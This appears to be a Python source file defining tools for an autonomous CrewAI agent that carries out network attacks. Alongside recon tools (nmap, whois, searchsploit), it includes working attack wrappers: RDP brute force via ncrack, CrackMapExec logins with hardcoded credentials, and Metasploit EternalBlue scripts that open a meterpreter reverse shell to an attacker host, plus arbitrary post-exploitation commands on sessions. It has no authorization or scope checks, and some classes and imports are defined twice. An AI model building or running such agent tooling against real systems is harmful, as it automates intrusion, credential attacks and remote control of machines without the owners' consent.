# src/cybercrew/tools/custom_tool.py

from crewai.tools import BaseTool
from typing import Type
from pydantic import BaseModel, Field
import subprocess

class NetworkScanInput(BaseModel):
    """Input schema for NetworkScanTool."""
    target: str = Field(..., description="Adresse IP ou nom de domaine de la cible à scanner")

class NetworkScanTool(BaseTool):
    name: str = "Scan Réseau"
    description: str = (
        "Outil de reconnaissance réseau qui utilise nmap pour scanner une cible et récupérer les ports ouverts, "
        "les services actifs, et les informations de résolution DNS."
    )
    args_schema: Type[BaseModel] = NetworkScanInput

    def _run(self, target: str) -> str:
        try:
            dns_result = ""
            if not target.replace('.', '').isdigit():  # si c'est un nom de domaine
                dns = subprocess.run(["nslookup", target], capture_output=True, text=True)
                dns_result = dns.stdout

            nmap = subprocess.run(["nmap", "-sV", "-Pn", target], capture_output=True, text=True)

            return f"--- Résolution DNS ---\n{dns_result}\n\n--- Résultat Nmap ---\n{nmap.stdout}"
        except Exception as e:
            return f"Erreur lors du scan : {str(e)}"

class VulnAnalysisInput(BaseModel):
    """Input schema for VulnAnalysisTool."""
    scan_results: str = Field(..., description="Résultats de scan à analyser pour trouver des vulnérabilités connues")

class VulnAnalysisTool(BaseTool):
    name: str = "Analyse Vulnérabilité"
    description: str = (
        "Analyse les résultats d’un scan réseau pour identifier les vulnérabilités connues, en se basant sur les signatures de services."
    )
    args_schema: Type[BaseModel] = VulnAnalysisInput

    def _run(self, scan_results: str) -> str:
        # Simule une analyse simple basée sur des mots-clés
        vuln_signatures = {
            "OpenSSH 7.2p2": "CVE-2016-10012 - Exécution de code possible",
            "Apache httpd 2.4.29": "CVE-2017-15710 - Révélation d'informations",
            "SMB 1.0": "CVE-2017-0144 - WannaCry (exploitation par EternalBlue)",
        }
        found_vulns = []
        for signature, vuln in vuln_signatures.items():
            if signature in scan_results:
                found_vulns.append(f"{signature} ➜ {vuln}")
        return "\n".join(found_vulns) if found_vulns else "Aucune vulnérabilité connue détectée."

class ExploitInput(BaseModel):
    """Input schema for ExploitTool."""
    vuln_report: str = Field(..., description="Rapport de vulnérabilités à exploiter")

class ExploitTool(BaseTool):
    name: str = "Exploit Simulation"
    description: str = (
        "Tente de simuler une exploitation des vulnérabilités identifiées, pour tester un accès possible."
    )
    args_schema: Type[BaseModel] = ExploitInput

    def _run(self, vuln_report: str) -> str:
        if "CVE-2017-0144" in vuln_report:
            return "Exploitation réussie : accès root simulé via EternalBlue."
        elif "CVE" in vuln_report:
            return "Exploit simulé tenté, mais accès non obtenu."
        else:
            return "Aucune vulnérabilité exploitable détectée."
        
class WhoisInput(BaseModel):
    target: str = Field(..., description="Nom de domaine à analyser via whois")

class WhoisLookupTool(BaseTool):
    name: str = "Whois Lookup"
    description: str = "Récupère les informations WHOIS d'un nom de domaine (propriétaire, registrar, etc.)"
    args_schema: Type[BaseModel] = WhoisInput

    def _run(self, target: str) -> str:
        try:
            result = subprocess.run(["whois", target], capture_output=True, text=True)
            return result.stdout
        except Exception as e:
            return f"Erreur lors de la commande whois : {str(e)}"

class SubdomainEnumInput(BaseModel):
    domain: str = Field(..., description="Nom de domaine pour rechercher les sous-domaines")

class SubdomainEnumerationTool(BaseTool):
    name: str = "Enumeration de sous-domaines"
    description: str = "Recherche les sous-domaines d’un domaine cible pour cartographier l’infrastructure."
    args_schema: Type[BaseModel] = SubdomainEnumInput

    def _run(self, domain: str) -> str:
        try:
            result = subprocess.run(["dig", f"*.{domain}", "+short"], capture_output=True, text=True)
            return result.stdout if result.stdout else "Aucun sous-domaine trouvé."
        except Exception as e:
            return f"Erreur durant la recherche de sous-domaines : {str(e)}"

class CVELookupInput(BaseModel):
    service: str = Field(..., description="Nom du service ou version pour chercher les CVE associés")

class CVELookupTool(BaseTool):
    name: str = "Recherche de CVE"
    description: str = "Recherche les vulnérabilités connues (CVE) pour un service donné."
    args_schema: Type[BaseModel] = CVELookupInput

    def _run(self, service: str) -> str:
        try:
            result = subprocess.run(["searchsploit", service], capture_output=True, text=True)
            return result.stdout
        except Exception as e:
            return f"Erreur lors de la recherche de CVE : {str(e)}"

class ExploitDBInput(BaseModel):
    keyword: str = Field(..., description="Mot-clé pour rechercher un exploit dans la base Exploit-DB")

class ExploitDBSearchTool(BaseTool):
    name: str = "Recherche Exploit-DB"
    description: str = "Recherche dans la base Exploit-DB des exploits associés à un mot-clé ou un service."
    args_schema: Type[BaseModel] = ExploitDBInput

    def _run(self, keyword: str) -> str:
        try:
            result = subprocess.run(["searchsploit", keyword], capture_output=True, text=True)
            return result.stdout
        except Exception as e:
            return f"Erreur lors de la recherche Exploit-DB : {str(e)}"

class ExploitToolInput(BaseModel):
    target: str = Field(..., description="Adresse IP de la cible")
    port: int = Field(..., description="Port cible à exploiter")
    service: str = Field(..., description="Service à exploiter (ex: postgresql, rtsp)")

class ExploitTool(BaseTool):
    name: str = "Exploit Réel"
    description: str = (
        "Exécute un exploit connu sur la cible spécifiée"
    )
    args_schema: Type[BaseModel] = ExploitToolInput

    def _run(self, target: str, port: int, service: str) -> str:
        try:
            result = subprocess.run(
                ["python3", "exploit_scripts/exploit_postgresql_9_6.py", target, str(port)],
                capture_output=True,
                text=True
            )
            return result.stdout
        except Exception as e:
            return f"Erreur lors de l'exploitation : {e}"

class PostgreSQLExploitInput(BaseModel):
    target: str = Field(..., description="Adresse IP de la cible")
    port: int = Field(..., description="Port PostgreSQL à exploiter")

class PostgreSQLExploitTool(BaseTool):
    name: str = "PostgreSQL Exploiter"
    description: str = "Tente une exploitation basique sur PostgreSQL 9.6 pour lister les utilisateurs ou exécuter une commande."

    args_schema: Type[BaseModel] = PostgreSQLExploitInput

    def _run(self, target: str, port: int) -> str:
        try:
            # Exemple de commande — nécessite que le service n'ait pas d'authentification (rare)
            cmd = ["psql", f"-h{target}", f"-p{port}", "-U", "postgres", "-c", "SELECT version();"]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            return f"Résultat de l'exploitation :\n{result.stdout or result.stderr}"
        except Exception as e:
            return f"Échec de l'exploitation : {str(e)}"

class RDPExploitInput(BaseModel):
    target: str = Field(..., description="Adresse IP cible")
    port: int = Field(default=3389)
    username: str = Field(..., description="Nom d'utilisateur à tester")
    password: str = Field(..., description="Mot de passe à tester")

class RDPExploitTool(BaseTool):
    name: str = "RDP Exploit (bruteforce)"
    description: str = "Tente une connexion RDP avec un couple login/mot de passe."

    args_schema: Type[BaseModel] = RDPExploitInput

    def _run(self, target: str, port: int, username: str, password: str) -> str:
        try:
            cmd = ["xfreerdp", f"/v:{target}:{port}", f"/u:{username}", f"/p:{password}", "/cert:ignore"]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
            return f"Résultat :\n{result.stdout or result.stderr}"
        except Exception as e:
            return f"Erreur lors de l'exploitation RDP : {str(e)}"

class NcrackInput(BaseModel):
    """Input schema for RDP brute-force attack using ncrack."""
    target: str = Field(..., description="Adresse IP ou domaine de la cible")
    usernames_file: str = Field(..., description="Chemin vers le fichier contenant les noms d'utilisateur")
    passwords_file: str = Field(..., description="Chemin vers le fichier contenant les mots de passe")

class NcrackTool(BaseTool):
    name: str = "Brute-force RDP avec Ncrack"
    description: str = (
        "Cet outil utilise ncrack pour effectuer une attaque par force brute sur le service RDP d'une cible. "
        "Il est utile pour tester la robustesse des mots de passe et identifier les identifiants faibles."
    )
    args_schema: Type[BaseModel] = NcrackInput

    def _run(self, target: str, usernames_file: str, passwords_file: str) -> str:
        try:
            cmd = [
                "ncrack",
                "-p", "3389",
                "-U", usernames_file,
                "-P", passwords_file,
                target
            ]
            result = subprocess.run(cmd, capture_output=True, text=True)
            return result.stdout or result.stderr
        except Exception as e:
            return f"Erreur lors de l'exécution de Ncrack : {str(e)}"

from crewai.tools import BaseTool
from typing import Type
from pydantic import BaseModel, Field
import subprocess

class ExploitInput(BaseModel):
    """Entrée pour outils d'exploitation."""
    target: str = Field(..., description="Adresse IP de la cible")
    port: int = Field(..., description="Port à exploiter")

class MetasploitExploitTool(BaseTool):
    name: str = "Metasploit Exploit"
    description: str = (
        "Utilise Metasploit pour exploiter la vulnérabilité MS17-010 EternalBlue via SMB."
    )
    args_schema: Type[BaseModel] = ExploitInput

    def _run(self, target: str, port: int) -> str:
        try:
            payload = f'''
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS {target}
set RPORT {port}
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.8.0.1
set LPORT 4444
exploit -z
'''
            with open("/tmp/msf.rc", "w") as f:
                f.write(payload)
            result = subprocess.run(["msfconsole", "-q", "-r", "/tmp/msf.rc"], capture_output=True, text=True)
            return result.stdout
        except Exception as e:
            return f"Erreur d'exploitation avec Metasploit : {e}"

class CMEExploitationTool(BaseTool):
    name: str = "CME Exploit"
    description: str = (
        "Utilise CrackMapExec (CME) pour tester l'accès SMB avec des identifiants connus."
    )
    args_schema: Type[BaseModel] = ExploitInput

    def _run(self, target: str, port: int) -> str:
        try:
            command = [
                "cme", "smb", target,
                "-u", "Administrator", "-p", "password123",
                "--shares"
            ]
            result = subprocess.run(command, capture_output=True, text=True)
            return result.stdout
        except Exception as e:
            return f"Erreur lors de l'utilisation de CrackMapExec : {e}"

class SMBVulnScanInput(BaseModel):
    target: str = Field(..., description="Adresse IP de la cible pour scanner SMB")

class SMBVulnScannerTool(BaseTool):
    name: str = "SMB Vulnerability Scanner"
    description: str = "Scanne les ports SMB (139/445) pour détecter les vulnérabilités connues comme EternalBlue."
    args_schema: Type[BaseModel] = SMBVulnScanInput

    def _run(self, target: str) -> str:
        try:
            cmd = ["nmap", "--script", "smb-vuln*","-p", "139,445", target]
            result = subprocess.run(cmd, capture_output=True, text=True)
            return result.stdout
        except Exception as e:
            return f"Erreur lors du scan de vulnérabilités SMB : {str(e)}"

class EternalBlueExploitInput(BaseModel):
    target: str = Field(..., description="Adresse IP de la cible")
    lhost: str = Field(..., description="IP de l'attaquant (Kali)")
    lport: int = Field(default=4444, description="Port local à écouter pour la connexion inversée")

class EternalBlueExploitTool(BaseTool):
    name: str = "EternalBlue Exploit via Metasploit"
    description: str = "Utilise Metasploit pour exploiter MS17-010 (EternalBlue) et obtenir un shell Meterpreter."
    args_schema: Type[BaseModel] = EternalBlueExploitInput

    def _run(self, target: str, lhost: str, lport: int) -> str:
        try:
            payload = f'''
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS {target}
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST {lhost}
set LPORT {lport}
exploit
'''
            with open("/tmp/eternalblue.rc", "w") as f:
                f.write(payload)
            result = subprocess.run(["msfconsole", "-q", "-r", "/tmp/eternalblue.rc"], capture_output=True, text=True, timeout=300)
            return result.stdout
        except Exception as e:
            return f"Erreur exploitation EternalBlue : {str(e)}"

class MeterpreterCommandInput(BaseModel):
    session_id: int = Field(..., description="ID de la session Meterpreter")
    command: str = Field(..., description="Commande Meterpreter à exécuter")

class MeterpreterPostExploitTool(BaseTool):
    name: str = "Meterpreter Post Exploit"
    description: str = "Exécute une commande post-exploitation sur une session Meterpreter active (ex: search, screenshot)."
    args_schema: Type[BaseModel] = MeterpreterCommandInput

    def _run(self, session_id: int, command: str) -> str:
        try:
            msf_command = f'''
sessions -i {session_id}
{command}
background
'''
            with open("/tmp/meterpreter_post.rc", "w") as f:
                f.write(msf_command)
            result = subprocess.run(["msfconsole", "-q", "-r", "/tmp/meterpreter_post.rc"], capture_output=True, text=True, timeout=120)
            return result.stdout
        except Exception as e:
            return f"Erreur post-exploitation Meterpreter : {str(e)}"


class PostExploitToolInput(BaseModel):
    actions: str = Field(..., description="Actions de post-exploitation  (e.g. persistance, nettoyage)")

class PostExploitTool(BaseTool):
    name: str = "Post Exploitation Simulation"
    description: str = "Simule des actions de post-exploitation comme la persistance ou le nettoyage."
    args_schema: Type[BaseModel] = PostExploitToolInput

    def _run(self, actions: str) -> str:
        return f"Actions post-exploitation: {actions} effectuées avec succès."


class CleanLogToolInput(BaseModel):
    system: str = Field(..., description="Système cible où supprimer les logs")

class LogCleanerTool(BaseTool):
    name: str = "Log Cleaner Tool"
    description: str = "Simule la suppression de traces dans les logs système."
    args_schema: Type[BaseModel] = CleanLogToolInput

    def _run(self, system: str) -> str:
        return f"Les logs sur le système {system} ont été nettoyés."


class ReportInput(BaseModel):
    content: str = Field(..., description="Contenu brut à structurer en rapport")

class ReportGeneratorTool(BaseTool):
    name: str = "Report Generator Tool"
    description: str = "Formate les résultats en un rapport structuré."
    args_schema: Type[BaseModel] = ReportInput

    def _run(self, content: str) -> str:
        return f"\n\n\n{content}\n\n"
